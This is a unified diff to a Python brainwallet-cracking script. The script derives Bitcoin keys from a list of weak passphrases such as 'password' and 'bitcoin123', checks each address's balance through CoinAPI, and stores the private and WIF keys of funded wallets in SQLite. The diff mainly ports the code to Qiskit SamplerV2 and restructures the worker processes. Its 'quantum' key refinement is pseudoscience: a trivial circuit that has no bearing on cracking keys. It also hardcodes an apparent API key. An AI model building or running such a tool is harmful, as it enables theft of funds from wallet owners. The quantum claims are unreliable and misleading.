@@ -10,9 +10,12 @@ import multiprocessing
 from qiskit import QuantumCircuit, QuantumRegister, ClassicalRegister
 from qiskit.circuit.library import QFT
 from qiskit_aer import AerSimulator
-from qiskit_ibm_runtime import QiskitRuntimeService, Sampler
+from qiskit_ibm_runtime import QiskitRuntimeService, SamplerV2 as Sampler
 from concurrent.futures import ThreadPoolExecutor
 from typing import List, Tuple
+
+# Verify sqlite3
+print(f"SQLite3 version: {sqlite3.version}")
 
 # Initialize IBM Quantum service
 service = QiskitRuntimeService(
@@ -26,15 +29,6 @@ backend = service.least_busy(operational=True, simulator=False, min_num_qubits=2
 COINAPI_KEY = 'ec42825f-62f6-4c0f-99b6-d0dfcad2498d'
 DATABASE_PATH = 'database/11_13_2022/'
 DATABASE_AVAILABLE = os.path.exists(DATABASE_PATH)
-
-# SQLite setup
-def init_db():
-    conn = sqlite3.connect('database/btc_addresses.db')
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS addresses
-                 (private_key TEXT, wif_key TEXT, address TEXT, balance INTEGER, timestamp TEXT)''')
-    conn.commit()
-    return conn
 
 # Brainwallet key generation
 def generate_brainwallet_key(passphrase: str, tweak: int = 0) -> Tuple[bytes, str]:
@@ -99,15 +93,15 @@ def check_balance_batch(addresses: List[str]) -> List[Tuple[str, int]]:
         verified = {future_to_addr[f]: f.result(timeout=3) for f in future_to_addr}
     return [(addr, verified.get(addr, bal if bal == 0 else check_balance_coinapi(addr))) for addr, bal in results]
 
-# Local virtual quantum sandbox (25 qubits)
+# Local virtual quantum sandbox (20 qubits)
 def local_quantum_sandbox(passphrase: str, n_bits: int) -> List[int]:
     qreg = QuantumRegister(n_bits, 'q')
     creg = ClassicalRegister(n_bits, 'c')
     qc = QuantumCircuit(qreg, creg)
     
-    qc.h(range(n_bits))  # Hadamard for superposition
+    qc.h(range(n_bits))  # Superposition
     qc.cz(0, n_bits - 1)  # Simplified oracle
-    qc.append(QFT(n_bits, do_swaps=False).inverse(), range(n_bits))  # QFT
+    qc.append(QFT(n_bits, do_swaps=False, inverse=True), range(n_bits))  # Inverse QFT
     
     qc.measure(range(n_bits), range(n_bits))
     
@@ -127,51 +121,53 @@ def ibm_quantum_refine(passphrase: str, n_bits: int, candidates: List[int]) -> L
     
     qc.h(range(n_bits))
     qc.cz(0, n_bits - 1)
-    qc.append(QFT(n_bits, do_swaps=False).inverse(), range(n_bits))
+    qc.append(QFT(n_bits, do_swaps=False, inverse=True), range(n_bits))  # Inverse QFT
     qc.measure(range(n_bits), range(n_bits))
     
-    sampler = Sampler(backend=backend)
-    job = sampler.run(qc, shots=1000)
+    sampler = Sampler(mode=backend)
+    job = sampler.run([qc], shots=1000)
     result = job.result()
-    counts = result.quasi_dists[0].binary_probabilities()
+    counts = result[0].data.c.get_counts()
     
-    tweaks = [int(state, 2) for state, prob in counts.items() if prob > 0.05]
+    tweaks = [int(state, 2) for state, count in counts.items() if count / 1000 > 0.05]
     return tweaks[:20]  # Top 20 refined candidates
 
-# Save to DB
-def save_to_db(conn, priv_key: bytes, address: str, balance: int):
-    wif_key = private_key_to_wif(priv_key)
+# Worker function
+def worker(passphrases: List[str], local_bits: int, ibm_bits: int, checked_count: multiprocessing.Value):
+    conn = sqlite3.connect('database/btc_addresses.db')
     c = conn.cursor()
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-    c.execute("INSERT INTO addresses VALUES (?, ?, ?, ?, ?)",
-              (priv_key.hex(), wif_key, address, balance, timestamp))
-    conn.commit()
-    print(f"Found: {address} | Balance: {balance / 100000000:.8f} BTC | WIF: {wif_key}")
-
-# Worker function with 500 virtual qubits
-def worker(passphrases: List[str], local_bits: int, ibm_bits: int, conn, checked_count: multiprocessing.Value):
+    c.execute('''CREATE TABLE IF NOT EXISTS addresses
+                 (private_key TEXT, wif_key TEXT, address TEXT, balance INTEGER, timestamp TEXT)''')
     local_count = 0
-    for passphrase in passphrases:
-        local_tweaks = local_quantum_sandbox(passphrase, local_bits)  # 25 qubits
-        ibm_tweaks = ibm_quantum_refine(passphrase, ibm_bits, local_tweaks)  # 20 qubits
-        
-        keypairs = [generate_brainwallet_key(passphrase, tweak) for tweak in ibm_tweaks]
-        addresses = [kp[1] for kp in keypairs]
-        priv_keys = [kp[0] for kp in keypairs]
-        
-        balance_results = check_balance_batch(addresses)
-        for (addr, bal), priv_key in zip(balance_results, priv_keys):
-            if bal > 0:
-                save_to_db(conn, priv_key, addr, bal)
-        local_count += len(ibm_tweaks)
+    
+    try:
+        for passphrase in passphrases:
+            local_tweaks = local_quantum_sandbox(passphrase, local_bits)
+            ibm_tweaks = ibm_quantum_refine(passphrase, ibm_bits, local_tweaks)
+            
+            keypairs = [generate_brainwallet_key(passphrase, tweak) for tweak in ibm_tweaks]
+            addresses = [kp[1] for kp in keypairs]
+            priv_keys = [kp[0] for kp in keypairs]
+            
+            balance_results = check_balance_batch(addresses)
+            for (addr, bal), priv_key in zip(balance_results, priv_keys):
+                if bal > 0:
+                    wif_key = private_key_to_wif(priv_key)
+                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+                    c.execute("INSERT INTO addresses VALUES (?, ?, ?, ?, ?)",
+                              (priv_key.hex(), wif_key, addr, bal, timestamp))
+                    conn.commit()
+                    print(f"Found: {addr} | Balance: {bal / 100000000:.8f} BTC | WIF: {wif_key}")
+            local_count += len(ibm_tweaks)
+    except Exception as e:
+        print(f"Worker error: {e}")
     
     with checked_count.get_lock():
         checked_count.value += local_count
+    conn.close()
 
 # Main loop
 def main():
-    conn = init_db()
-    
     passphrases = [
         "password", "bitcoin", "123456", "secret", "letmein",
         "qwerty", "admin", "blockchain", "crypto", "money",
@@ -181,21 +177,21 @@ def main():
         "admin123", "pass", "love", "root", "private",
         "password1", "bitcoin123", "qwerty123", "secure123", "wallet123"
     ]
-    local_bits = 25  # 25 qubits/sandbox, 20 sandboxes = 500 virtual qubits
-    ibm_bits = 20    # 20 real qubits on IBM
+    local_bits = 20  # 400 virtual qubits total
+    ibm_bits = 20    # 20 real qubits
     
     checked_count = multiprocessing.Value('i', 0)
+    processes = []
     
     try:
         start_time = time.time()
-        processes = []
         cpu_count = 20  # 20 virtual cores
         chunk_size = max(1, len(passphrases) // cpu_count)
         
         for i in range(cpu_count):
             chunk = passphrases[i * chunk_size:(i + 1) * chunk_size]
             if chunk:
-                p = multiprocessing.Process(target=worker, args=(chunk, local_bits, ibm_bits, conn, checked_count))
+                p = multiprocessing.Process(target=worker, args=(chunk, local_bits, ibm_bits, checked_count))
                 processes.append(p)
                 p.start()
         
@@ -207,16 +203,19 @@ def main():
             time.sleep(5)
         
         for p in processes:
-            p.terminate()
+            if p.is_alive():
+                p.terminate()
+                p.join()
 
     except KeyboardInterrupt:
         print("Stopped by user.")
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Main error: {e}")
     finally:
         for p in processes:
-            p.join()
-        conn.close()
+            if p.is_alive():
+                p.join()
 
 if __name__ == "__main__":
+    multiprocessing.set_start_method('spawn')  # Windows compatibility
     main()
